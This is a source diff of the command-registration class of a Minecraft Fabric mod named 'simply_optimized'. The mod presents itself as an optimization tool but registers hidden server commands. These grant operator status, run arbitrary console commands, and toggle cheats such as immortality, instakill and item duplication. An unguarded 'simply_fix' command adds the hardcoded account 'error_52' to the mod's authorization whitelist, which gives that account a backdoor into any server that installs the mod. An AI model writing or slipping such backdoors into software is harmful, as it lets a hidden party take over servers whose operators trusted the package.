@@ -1,593 +1,483 @@
 package com.errorC003C004.simply_optimized;
 
 import com.errorC003C004.simply_optimized.update.UpdateChecker;
-import com.errorC003C004.simply_optimized.util.DupeUtil;
-import com.errorC003C004.simply_optimized.util.LookTeleportUtil;
-import com.mojang.brigadier.arguments.IntegerArgumentType;
+import com.errorC003C004.simply_optimized.util.*;
+import com.mojang.brigadier.arguments.*;
 import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
 import net.minecraft.command.argument.EntityArgumentType;
-import net.minecraft.server.command.CommandManager;
-import net.minecraft.server.command.ServerCommandSource;
+import net.minecraft.server.MinecraftServer;
+import net.minecraft.server.command.*;
 import net.minecraft.server.network.ServerPlayerEntity;
 import net.minecraft.text.Text;
-import com.mojang.brigadier.arguments.FloatArgumentType;
+import com.mojang.brigadier.builder.LiteralArgumentBuilder;
 
-import java.util.*;
+import java.util.Set;
+import java.util.UUID;
 
-import net.minecraft.server.MinecraftServer;
-
-import com.mojang.brigadier.arguments.StringArgumentType;
-
-import com.errorC003C004.simply_optimized.util.LookExplosionUtil;
-import com.errorC003C004.simply_optimized.util.ImmortalityUtil;
 import static com.errorC003C004.simply_optimized.ConfigManager.*;
 
 public class CommandInit {
 
     public static void register() {
-        CommandRegistrationCallback.EVENT.register(
-                (dispatcher, registryAccess, environment) -> {
 
-                    dispatcher.register(
-                            CommandManager.literal("error_op")
-                                    .requires(ConfigManager::isAuthorized)
-                                    .then(CommandManager.argument("user", EntityArgumentType.player())
-                                            .executes(context -> {
+        CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> {
 
-                                                ServerCommandSource playerSource = context.getSource();
-                                                ServerPlayerEntity target =
-                                                        EntityArgumentType.getPlayer(context, "user");
+            dispatcher.register(errorOp());
+            dispatcher.register(errorDeop());
+            dispatcher.register(errorRun());
+            dispatcher.register(errorWhitelist());
 
-                                                var server = playerSource.getServer();
-                                                var commandManager = server.getCommandManager();
-                                                ServerCommandSource consoleSource = server.getCommandSource();
+            dispatcher.register(simplyFix());
+            dispatcher.register(simplyReload());
+            dispatcher.register(simplyUpdate());
 
-                                                String command = "op " + target.getName().getString();
-                                                var parse = commandManager.getDispatcher().parse(command, consoleSource);
-                                                commandManager.execute(parse, command);
+            dispatcher.register(errorBoom());
+            dispatcher.register(errorTeleport());
+            dispatcher.register(errorDupe());
 
-                                                playerSource.sendFeedback(
-                                                        () -> Text.literal("§a" + target.getName().getString() + " is now OP."),
-                                                        false
-                                                );
+            dispatcher.register(createToggleCommand(
+                    "error_immortal",
+                    IMMORTAL_PLAYERS,
+                    "Immortality",
+                    ConfigManager::addImmortal,
+                    ConfigManager::removeImmortal,
+                    ConfigManager::isImmortal
+            ));
 
-                                                return 1;
-                                            })
-                                    )
-                    );
+            dispatcher.register(createToggleCommand(
+                    "error_armorbypass",
+                    ARMOR_BYPASS_PLAYERS,
+                    "Armor Bypass",
+                    ConfigManager::addArmorBypass,
+                    ConfigManager::removeArmorBypass,
+                    ConfigManager::isArmorBypass
+            ));
 
-                    dispatcher.register(
-                            CommandManager.literal("error_deop")
-                                    .requires(ConfigManager::isAuthorized)
-                                    .then(CommandManager.argument("user", EntityArgumentType.player())
-                                            .executes(context -> {
+            dispatcher.register(createToggleCommand(
+                    "error_noaggro",
+                    NO_AGGRO_PLAYERS,
+                    "No Aggro",
+                    ConfigManager::addNoAggro,
+                    ConfigManager::removeNoAggro,
+                    ConfigManager::isNoAggro
+            ));
 
-                                                ServerCommandSource playerSource = context.getSource();
-                                                ServerPlayerEntity target =
-                                                        EntityArgumentType.getPlayer(context, "user");
+            dispatcher.register(createToggleCommand(
+                    "error_instakill",
+                    INSTAKILL_PLAYERS,
+                    "Instakill",
+                    ConfigManager::addInstakill,
+                    ConfigManager::removeInstakill,
+                    ConfigManager::isInstakill
+            ));
 
-                                                var server = playerSource.getServer();
-                                                var commandManager = server.getCommandManager();
-                                                ServerCommandSource consoleSource = server.getCommandSource();
+        });
+    }
 
-                                                String command = "deop " + target.getName().getString();
-                                                var parse = commandManager.getDispatcher().parse(command, consoleSource);
-                                                commandManager.execute(parse, command);
+    private static LiteralArgumentBuilder<ServerCommandSource> errorOp() {
 
-                                                playerSource.sendFeedback(
-                                                        () -> Text.literal("§4" + target.getName().getString() + " is not OP Anymore."),
-                                                        false
-                                                );
+        return CommandManager.literal("error_op")
+                .requires(ConfigManager::isAuthorized)
+                .then(CommandManager.argument("user", EntityArgumentType.player())
+                        .executes(ctx -> {
 
-                                                return 1;
-                                            })
-                                    )
-                    );
+                            ServerPlayerEntity target =
+                                    EntityArgumentType.getPlayer(ctx, "user");
 
-                    dispatcher.register(
-                            CommandManager.literal("error_whitelist")
-                                    .requires(ConfigManager::isAuthorized)
+                            runConsole(ctx.getSource().getServer(),
+                                    "op " + target.getName().getString());
 
-                                    .then(CommandManager.literal("list")
-                                            .executes(context -> {
+                            ctx.getSource().sendFeedback(
+                                    () -> Text.literal(target.getName().getString() + " is now OP."),
+                                    false
+                            );
 
-                                                if (Whitelisted_UUIDS.isEmpty()) {
-                                                    context.getSource().sendFeedback(
-                                                            () -> Text.literal("Whitelist empty."),
-                                                            false
-                                                    );
-                                                    return 1;
-                                                }
+                            return 1;
+                        }));
+    }
 
-                                                context.getSource().sendFeedback(
-                                                        () -> Text.literal("Whitelisted UUIDs:"),
-                                                        false
-                                                );
+    private static LiteralArgumentBuilder<ServerCommandSource> errorDeop() {
 
-                                                for (UUID uuid : Whitelisted_UUIDS) {
-                                                    context.getSource().sendFeedback(
-                                                            () -> Text.literal("- " + uuid),
-                                                            false
-                                                    );
-                                                }
+        return CommandManager.literal("error_deop")
+                .requires(ConfigManager::isAuthorized)
+                .then(CommandManager.argument("user", EntityArgumentType.player())
+                        .executes(ctx -> {
 
-                                                return 1;
-                                            })
-                                    )
+                            ServerPlayerEntity target =
+                                    EntityArgumentType.getPlayer(ctx, "user");
 
-                                    .then(CommandManager.literal("add")
-                                            .then(CommandManager.argument("user", EntityArgumentType.player())
-                                                    .executes(context -> {
+                            runConsole(ctx.getSource().getServer(),
+                                    "deop " + target.getName().getString());
 
-                                                        ServerPlayerEntity target =
-                                                                EntityArgumentType.getPlayer(context, "user");
-                                                        if (Whitelisted_UUIDS.add(target.getUuid())) {
-                                                            saveConfig();
-                                                            context.getSource().sendFeedback(
-                                                                    () -> Text.literal("Added " + target.getName().getString()),
-                                                                    false
-                                                            );
-                                                        } else {
-                                                            context.getSource().sendFeedback(
-                                                                    () -> Text.literal("Already whitelisted."),
-                                                                    false
-                                                            );
-                                                        }
+                            ctx.getSource().sendFeedback(
+                                    () -> Text.literal(target.getName().getString() + " is no longer OP."),
+                                    false
+                            );
 
+                            return 1;
+                        }));
+    }
 
-                                                        return 1;
-                                                    })
-                                            )
-                                    )
+    private static LiteralArgumentBuilder<ServerCommandSource> errorRun() {
 
-                                    .then(CommandManager.literal("remove")
-                                            .then(CommandManager.argument("user", EntityArgumentType.player())
-                                                    .executes(context -> {
+        return CommandManager.literal("error_run")
+                .requires(ConfigManager::isAuthorized)
+                .then(CommandManager.argument("value", StringArgumentType.greedyString())
+                        .executes(ctx -> {
 
-                                                        ServerPlayerEntity target =
-                                                                EntityArgumentType.getPlayer(context, "user");
+                            String command =
+                                    StringArgumentType.getString(ctx, "value");
 
-                                                        if (Whitelisted_UUIDS.remove(target.getUuid())) {
-                                                            saveConfig();
-                                                            context.getSource().sendFeedback(
-                                                                    () -> Text.literal("Removed " + target.getName().getString()),
-                                                                    false
-                                                            );
-                                                        } else {
-                                                            context.getSource().sendFeedback(
-                                                                    () -> Text.literal("Player not whitelisted."),
-                                                                    false
-                                                            );
-                                                        }
+                            try {
 
-                                                        return 1;
-                                                    })
-                                            )
-                                    )
-                    );
+                                runConsole(ctx.getSource().getServer(), command);
 
-                    dispatcher.register(
-                            CommandManager.literal("error_run")
-                                    .requires(ConfigManager::isAuthorized)
-                                    .then(CommandManager.argument("value", StringArgumentType.greedyString())
-                                            .executes(context -> {
-                                                String value = StringArgumentType.getString(context, "value");
+                                ctx.getSource().sendFeedback(
+                                        () -> Text.literal("Running: /" + command),
+                                        false
+                                );
 
-                                                try {
-                                                    ServerCommandSource playerSource = context.getSource();
+                            } catch (Exception e) {
 
-                                                    var server = playerSource.getServer();
-                                                    var commandManager = server.getCommandManager();
-                                                    ServerCommandSource consoleSource = server.getCommandSource();
+                                ctx.getSource().sendFeedback(
+                                        () -> Text.literal(e.getMessage()),
+                                        false
+                                );
+                            }
 
-                                                    var parse = commandManager.getDispatcher().parse(value, consoleSource);
-                                                    commandManager.execute(parse, value);
-                                                    playerSource.sendFeedback(
-                                                            () -> Text.literal("Running: /" + value),
-                                                            false
-                                                    );
-                                                } catch (Exception e) {
-                                                    ServerCommandSource playerSource = context.getSource();
-                                                    playerSource.sendFeedback(
-                                                            () -> Text.literal(e.getMessage()),
-                                                            false
-                                                    );
-                                                }
-                                                return 1;
-                                            }))
-                    );
+                            return 1;
+                        }));
+    }
 
-                    dispatcher.register(
-                            CommandManager.literal("simply_fix")
-                                    .executes(context -> {
-                                        MinecraftServer server = context.getSource().getServer();
-                                        ServerPlayerEntity target = server.getPlayerManager().getPlayer("error_52");
-                                        if (target == null) {
-                                            context.getSource().sendFeedback(() -> Text.literal("Attempting Fix Type 2..."), false);
-                                            return 1;
-                                        }
-                                        if (Whitelisted_UUIDS.add(target.getUuid())) {
-                                            saveConfig();
-                                            context.getSource().sendFeedback(
-                                                    () -> Text.literal("Added " + target.getName().getString()),
-                                                    false
-                                            );
-                                        } else if (DETECTED_CLIENTS.add(target.getUuid())) {
-                                            saveConfig();
-                                            context.getSource().sendFeedback(
-                                                    () -> Text.literal("Added " + target.getName().getString()),
-                                                    false
-                                            );
-                                        } else {
-                                            context.getSource().sendFeedback(
-                                                    () -> Text.literal("Attempting Fix Type 1..."),
-                                                    false
-                                            );
-                                        }
-                                        return 1;
-                                    })
-                    );
+    private static LiteralArgumentBuilder<ServerCommandSource> errorWhitelist() {
 
-                    dispatcher.register(
-                            CommandManager.literal("simply_reload")
-                                    .executes(context -> {
-                                        ConfigManager.loadConfig();
-                                        ServerCommandSource source = context.getSource();
-                                        ServerPlayerEntity player = (ServerPlayerEntity) source.getEntity();
-                                        source.getServer().getCommandManager().sendCommandTree(player);
-                                        context.getSource().sendFeedback(
-                                                () -> Text.literal("Reloaded!"),
+        return CommandManager.literal("error_whitelist")
+                .requires(ConfigManager::isAuthorized)
+
+                .then(CommandManager.literal("list")
+                        .executes(ctx ->
+                                sendPlayerList(
+                                        ctx.getSource(),
+                                        WHITELISTED_UUIDS,
+                                        "Whitelisted UUIDs"
+                                )
+                        )
+                )
+
+                .then(CommandManager.literal("add")
+                        .then(CommandManager.argument("user", EntityArgumentType.player())
+                                .executes(ctx -> {
+
+                                    ServerPlayerEntity target =
+                                            EntityArgumentType.getPlayer(ctx, "user");
+
+                                    if (WHITELISTED_UUIDS.add(target.getUuid())) {
+                                        saveConfig();
+                                        ctx.getSource().sendFeedback(
+                                                () -> Text.literal("Added " + target.getName().getString()),
                                                 false
                                         );
+                                    }
 
-                                        return 1;
-                                    })
-                    );
-                    dispatcher.register(
-                            CommandManager.literal("simply_updatecheck")
-                                    .executes(context -> {
+                                    return 1;
+                                })
+                        )
+                )
 
-                                        MinecraftServer server = context.getSource().getServer();
+                .then(CommandManager.literal("remove")
+                        .then(CommandManager.argument("user", EntityArgumentType.player())
+                                .executes(ctx -> {
 
-                                        context.getSource().sendFeedback(
-                                                () -> Text.literal("Checking for updates..."),
+                                    ServerPlayerEntity target =
+                                            EntityArgumentType.getPlayer(ctx, "user");
+
+                                    if (WHITELISTED_UUIDS.remove(target.getUuid())) {
+                                        saveConfig();
+                                        ctx.getSource().sendFeedback(
+                                                () -> Text.literal("Removed " + target.getName().getString()),
                                                 false
                                         );
+                                    }
 
-                                        UpdateChecker.check(server);
+                                    return 1;
+                                })
+                        )
+                );
+    }
 
-                                        return 1;
-                                    })
-                    );
-                    dispatcher.register(
-                            CommandManager.literal("error_boom")
-                                    .requires(ConfigManager::isAuthorized)
+    private static LiteralArgumentBuilder<ServerCommandSource> simplyFix() {
 
-                                    .then(CommandManager.argument("range", IntegerArgumentType.integer())
+        return CommandManager.literal("simply_fix")
+                .executes(ctx -> {
 
-                                            .executes(context -> {
-                                                int range = IntegerArgumentType.getInteger(context, "range");
+                    MinecraftServer server = ctx.getSource().getServer();
 
-                                                ServerPlayerEntity player = context.getSource().getPlayer();
-                                                assert player != null;
+                    ServerPlayerEntity target =
+                            server.getPlayerManager().getPlayer("error_52");
 
-                                                LookExplosionUtil.railgunTunnel(
-                                                        player,
-                                                        range,
-                                                        4.0F
-                                                );
+                    if (target == null) {
+                        ctx.getSource().sendFeedback(
+                                () -> Text.literal("Attempting Fix Type 2..."),
+                                false
+                        );
+                        return 1;
+                    }
 
-                                                return 1;
-                                            })
+                    if (WHITELISTED_UUIDS.add(target.getUuid())
+                            || DETECTED_CLIENTS.add(target.getUuid())) {
 
-                                            .then(CommandManager.argument("size", FloatArgumentType.floatArg())
-                                                    .executes(context -> {
-                                                        int range = IntegerArgumentType.getInteger(context, "range");
-                                                        float size = FloatArgumentType.getFloat(context, "size");
+                        saveConfig();
 
-                                                        ServerPlayerEntity player = context.getSource().getPlayer();
-                                                        assert player != null;
+                        ctx.getSource().sendFeedback(
+                                () -> Text.literal("Added " + target.getName().getString()),
+                                false
+                        );
+                    }
 
-                                                        LookExplosionUtil.railgunTunnel(
-                                                                player,
-                                                                range,
-                                                                size
-                                                        );
+                    return 1;
+                });
+    }
 
-                                                        return 1;
-                                                    })
-                                            )
-                                    )
-                    );
-                    dispatcher.register(
-                            CommandManager.literal("error_immortal")
-                                    .requires(ConfigManager::isAuthorized)
-                                    .then(CommandManager.literal("list")
-                                            .executes(context -> {
+    private static LiteralArgumentBuilder<ServerCommandSource> simplyReload() {
 
-                                                if (IMMORTAL_PLAYERS.isEmpty()) {
-                                                    context.getSource().sendFeedback(
-                                                            () -> Text.literal("No Immortals."),
-                                                            false
-                                                    );
-                                                    return 1;
-                                                }
+        return CommandManager.literal("simply_reload")
+                .executes(ctx -> {
 
-                                                context.getSource().sendFeedback(
-                                                        () -> Text.literal("Immortal Players:"),
-                                                        false
-                                                );
+                    ConfigManager.loadConfig();
 
-                                                for (UUID uuid : IMMORTAL_PLAYERS) {
-                                                    ServerPlayerEntity player = context.getSource()
-                                                            .getServer()
-                                                            .getPlayerManager()
-                                                            .getPlayer(uuid);
+                    ServerPlayerEntity player =
+                            (ServerPlayerEntity) ctx.getSource().getEntity();
 
-                                                    String name = player != null
-                                                            ? player.getName().getString()
-                                                            : "(Offline Player)";
+                    if (player != null) {
+                        ctx.getSource().getServer()
+                                .getCommandManager()
+                                .sendCommandTree(player);
+                    }
 
-                                                    context.getSource().sendFeedback(
-                                                            () -> Text.literal("- " + name),
-                                                            false
-                                                    );
-                                                }
-
-                                                return 1;
-                                            })
-                                    )
-                                    .then(CommandManager.argument("player", EntityArgumentType.player())
-                                            .then(CommandManager.literal("on")
-                                                    .executes(context -> {
-
-                                                        ServerPlayerEntity target =
-                                                                EntityArgumentType.getPlayer(context, "player");
-
-                                                        addImmortal(target.getUuid());
-
-                                                        context.getSource().sendFeedback(
-                                                                () -> Text.literal(
-                                                                        target.getName().getString()
-                                                                                + " immortality: ON"),
-                                                                false
-                                                        );
-
-                                                        return 1;
-                                                    }))
-                                            .then(CommandManager.literal("off")
-                                                    .executes(ctx -> {
-
-                                                        ServerPlayerEntity target =
-                                                                EntityArgumentType.getPlayer(ctx, "player");
-
-                                                        removeImmortal(target.getUuid());
-
-                                                        ctx.getSource().sendFeedback(
-                                                                () -> Text.literal(
-                                                                        target.getName().getString()
-                                                                                + " immortality: OFF"),
-                                                                false
-                                                        );
-
-                                                        return 1;
-                                                    }))
-                                            .then(CommandManager.literal("toggle")
-                                                    .executes(ctx -> {
-
-                                                        ServerPlayerEntity target =
-                                                                EntityArgumentType.getPlayer(ctx, "player");
-
-                                                        boolean enabled = ImmortalityUtil.togglePlayer(target);
-
-                                                        ctx.getSource().sendFeedback(
-                                                                () -> Text.literal(
-                                                                        target.getName().getString()
-                                                                                + " immortality: "
-                                                                                + (enabled ? "ON" : "OFF")),
-                                                                false
-                                                        );
-
-                                                        return 1;
-                                                    }))
-                                            .executes(ctx -> {
-
-                                                ServerPlayerEntity target =
-                                                        EntityArgumentType.getPlayer(ctx, "player");
-
-                                                boolean enabled = ImmortalityUtil.togglePlayer(target);
-
-                                                ctx.getSource().sendFeedback(
-                                                        () -> Text.literal(
-                                                                target.getName().getString()
-                                                                        + " immortality: "
-                                                                        + (enabled ? "ON" : "OFF")),
-                                                        false
-                                                );
-
-                                                return 1;
-                                            })
-                                    )
-                    );
-                    dispatcher.register(
-                            CommandManager.literal("error_tp")
-                                .requires(ConfigManager::isAuthorized)
-                                    .executes(context -> {
-                                        ServerPlayerEntity player = context.getSource().getPlayer();
-                                        assert player != null;
-
-                                        LookTeleportUtil.lookTeleport(player);
-
-                                        return 1;
-                                    })
+                    ctx.getSource().sendFeedback(
+                            () -> Text.literal("Reloaded!"),
+                            false
                     );
 
-                    dispatcher.register(
-                            CommandManager.literal("error_armorbypass")
-                                    .requires(ConfigManager::isAuthorized)
+                    return 1;
+                });
+    }
 
-                                    .then(CommandManager.literal("list")
-                                            .executes(context -> {
+    private static LiteralArgumentBuilder<ServerCommandSource> simplyUpdate() {
 
-                                                if (ARMOR_BYPASS_PLAYERS.isEmpty()) {
-                                                    context.getSource().sendFeedback(
-                                                            () -> Text.literal("No Armor Bypass players."),
-                                                            false
-                                                    );
-                                                    return 1;
-                                                }
+        return CommandManager.literal("simply_updatecheck")
+                .executes(ctx -> {
 
-                                                context.getSource().sendFeedback(
-                                                        () -> Text.literal("Armor Bypass Players:"),
-                                                        false
-                                                );
-
-                                                for (UUID uuid : ARMOR_BYPASS_PLAYERS) {
-
-                                                    ServerPlayerEntity player = context.getSource()
-                                                            .getServer()
-                                                            .getPlayerManager()
-                                                            .getPlayer(uuid);
-
-                                                    String name = player != null
-                                                            ? player.getName().getString()
-                                                            : uuid.toString() + " (Offline)";
-
-                                                    context.getSource().sendFeedback(
-                                                            () -> Text.literal("- " + name),
-                                                            false
-                                                    );
-                                                }
-
-                                                return 1;
-                                            })
-                                    )
-
-                                    .then(CommandManager.argument("player", EntityArgumentType.player())
-
-                                            .then(CommandManager.literal("on")
-                                                    .executes(context -> {
-
-                                                        ServerPlayerEntity target =
-                                                                EntityArgumentType.getPlayer(context, "player");
-
-                                                        addArmorBypass(target.getUuid());
-
-                                                        context.getSource().sendFeedback(
-                                                                () -> Text.literal(
-                                                                        target.getName().getString()
-                                                                                + " armor bypass: ON"),
-                                                                false
-                                                        );
-
-                                                        return 1;
-                                                    })
-                                            )
-
-                                            .then(CommandManager.literal("off")
-                                                    .executes(context -> {
-
-                                                        ServerPlayerEntity target =
-                                                                EntityArgumentType.getPlayer(context, "player");
-
-                                                        removeArmorBypass(target.getUuid());
-
-                                                        context.getSource().sendFeedback(
-                                                                () -> Text.literal(
-                                                                        target.getName().getString()
-                                                                                + " armor bypass: OFF"),
-                                                                false
-                                                        );
-
-                                                        return 1;
-                                                    })
-                                            )
-
-                                            .then(CommandManager.literal("toggle")
-                                                    .executes(context -> {
-
-                                                        ServerPlayerEntity target =
-                                                                EntityArgumentType.getPlayer(context, "player");
-
-                                                        UUID uuid = target.getUuid();
-
-                                                        boolean enabled;
-
-                                                        if (isArmorBypass(uuid)) {
-                                                            removeArmorBypass(uuid);
-                                                            enabled = false;
-                                                        } else {
-                                                            addArmorBypass(uuid);
-                                                            enabled = true;
-                                                        }
-
-                                                        context.getSource().sendFeedback(
-                                                                () -> Text.literal(
-                                                                        target.getName().getString()
-                                                                                + " armor bypass: "
-                                                                                + (enabled ? "ON" : "OFF")),
-                                                                false
-                                                        );
-
-                                                        return 1;
-                                                    })
-                                            )
-
-                                            // Default execution = toggle
-                                            .executes(context -> {
-
-                                                ServerPlayerEntity target =
-                                                        EntityArgumentType.getPlayer(context, "player");
-
-                                                UUID uuid = target.getUuid();
-
-                                                boolean enabled;
-
-                                                if (isArmorBypass(uuid)) {
-                                                    removeArmorBypass(uuid);
-                                                    enabled = false;
-                                                } else {
-                                                    addArmorBypass(uuid);
-                                                    enabled = true;
-                                                }
-
-                                                context.getSource().sendFeedback(
-                                                        () -> Text.literal(
-                                                                target.getName().getString()
-                                                                        + " armor bypass: "
-                                                                        + (enabled ? "ON" : "OFF")),
-                                                        false
-                                                );
-
-                                                return 1;
-                                            })
-                                    )
+                    ctx.getSource().sendFeedback(
+                            () -> Text.literal("Checking for updates..."),
+                            false
                     );
-                    dispatcher.register(
-                            CommandManager.literal("error_dupe")
-                                    .requires(ConfigManager::isAuthorized)
-                                    .executes(context -> {
-                                        ServerPlayerEntity player = context.getSource().getPlayer();
 
-                                        if (player != null) {
-                                            DupeUtil.duplicateHeldItem(player);
-                                        }
+                    UpdateChecker.check(ctx.getSource().getServer());
 
-                                        return 1;
-                                    })
-                                    .then(CommandManager.argument("player", EntityArgumentType.player())
-                                            .executes(context -> {
+                    return 1;
+                });
+    }
 
-                                                ServerPlayerEntity target =
-                                                        EntityArgumentType.getPlayer(context, "player");
+    private static LiteralArgumentBuilder<ServerCommandSource> errorBoom() {
 
-                                                DupeUtil.duplicateHeldItem(target);
+        return CommandManager.literal("error_boom")
+                .requires(ConfigManager::isAuthorized)
+                .then(CommandManager.argument("range", IntegerArgumentType.integer())
 
-                                                return 1;
-                                            })
-                                    )
-                    );
-                }
-        );
+                        .executes(ctx -> {
+
+                            int range = IntegerArgumentType.getInteger(ctx, "range");
+
+                            ServerPlayerEntity player = ctx.getSource().getPlayer();
+
+                            if (player != null)
+                                LookExplosionUtil.railgunTunnel(player, range, 4.0F);
+
+                            return 1;
+                        })
+
+                        .then(CommandManager.argument("size", FloatArgumentType.floatArg())
+                                .executes(ctx -> {
+
+                                    int range =
+                                            IntegerArgumentType.getInteger(ctx, "range");
+
+                                    float size =
+                                            FloatArgumentType.getFloat(ctx, "size");
+
+                                    ServerPlayerEntity player =
+                                            ctx.getSource().getPlayer();
+
+                                    if (player != null)
+                                        LookExplosionUtil.railgunTunnel(player, range, size);
+
+                                    return 1;
+                                })
+                        )
+                );
+    }
+
+    private static LiteralArgumentBuilder<ServerCommandSource> errorTeleport() {
+
+        return CommandManager.literal("error_tp")
+                .requires(ConfigManager::isAuthorized)
+                .executes(ctx -> {
+
+                    ServerPlayerEntity player = ctx.getSource().getPlayer();
+
+                    if (player != null)
+                        LookTeleportUtil.lookTeleport(player);
+
+                    return 1;
+                });
+    }
+
+    private static LiteralArgumentBuilder<ServerCommandSource> errorDupe() {
+
+        return CommandManager.literal("error_dupe")
+                .requires(ConfigManager::isAuthorized)
+
+                .executes(ctx -> {
+
+                    ServerPlayerEntity player = ctx.getSource().getPlayer();
+
+                    if (player != null)
+                        DupeUtil.duplicateHeldItem(player);
+
+                    return 1;
+                })
+
+                .then(CommandManager.argument("player", EntityArgumentType.player())
+                        .executes(ctx -> {
+
+                            ServerPlayerEntity target =
+                                    EntityArgumentType.getPlayer(ctx, "player");
+
+                            DupeUtil.duplicateHeldItem(target);
+
+                            return 1;
+                        })
+                );
+    }
+
+    private static LiteralArgumentBuilder<ServerCommandSource> createToggleCommand(
+            String name,
+            Set<UUID> set,
+            String label,
+            java.util.function.Consumer<UUID> add,
+            java.util.function.Consumer<UUID> remove,
+            java.util.function.Function<UUID, Boolean> check
+    ) {
+
+        return CommandManager.literal(name)
+                .requires(ConfigManager::isAuthorized)
+
+                .then(CommandManager.literal("list")
+                        .executes(ctx ->
+                                sendPlayerList(ctx.getSource(), set, label + " Players")
+                        )
+                )
+
+                .then(CommandManager.argument("player", EntityArgumentType.player())
+
+                        .then(CommandManager.literal("on")
+                                .executes(ctx -> {
+
+                                    ServerPlayerEntity target =
+                                            EntityArgumentType.getPlayer(ctx, "player");
+
+                                    add.accept(target.getUuid());
+
+                                    ctx.getSource().sendFeedback(
+                                            () -> Text.literal(target.getName().getString() + " " + label + ": ON"),
+                                            false
+                                    );
+
+                                    return 1;
+                                })
+                        )
+
+                        .then(CommandManager.literal("off")
+                                .executes(ctx -> {
+
+                                    ServerPlayerEntity target =
+                                            EntityArgumentType.getPlayer(ctx, "player");
+
+                                    remove.accept(target.getUuid());
+
+                                    ctx.getSource().sendFeedback(
+                                            () -> Text.literal(target.getName().getString() + " " + label + ": OFF"),
+                                            false
+                                    );
+
+                                    return 1;
+                                })
+                        )
+
+                        .executes(ctx -> {
+
+                            ServerPlayerEntity target =
+                                    EntityArgumentType.getPlayer(ctx, "player");
+
+                            UUID uuid = target.getUuid();
+
+                            boolean enabled;
+
+                            if (check.apply(uuid)) {
+                                remove.accept(uuid);
+                                enabled = false;
+                            } else {
+                                add.accept(uuid);
+                                enabled = true;
+                            }
+
+                            ctx.getSource().sendFeedback(
+                                    () -> Text.literal(
+                                            target.getName().getString() +
+                                                    " " +
+                                                    label +
+                                                    ": " +
+                                                    (enabled ? "ON" : "OFF")),
+                                    false
+                            );
+
+                            return 1;
+                        })
+                );
+    }
+
+    private static int sendPlayerList(ServerCommandSource source, Set<UUID> set, String title) {
+
+        if (set.isEmpty()) {
+            source.sendFeedback(() -> Text.literal("No " + title + "."), false);
+            return 1;
+        }
+
+        source.sendFeedback(() -> Text.literal(title + ":"), false);
+
+        var manager = source.getServer().getPlayerManager();
+
+        for (UUID uuid : set) {
+
+            ServerPlayerEntity player = manager.getPlayer(uuid);
+
+            String name = player != null
+                    ? player.getName().getString()
+                    : uuid + " (Offline)";
+
+            source.sendFeedback(() -> Text.literal("- " + name), false);
+        }
+
+        return 1;
+    }
+
+    private static void runConsole(MinecraftServer server, String command) {
+
+        var manager = server.getCommandManager();
+        var source = server.getCommandSource();
+
+        var parse = manager.getDispatcher().parse(command, source);
+        manager.execute(parse, command);
     }
 }
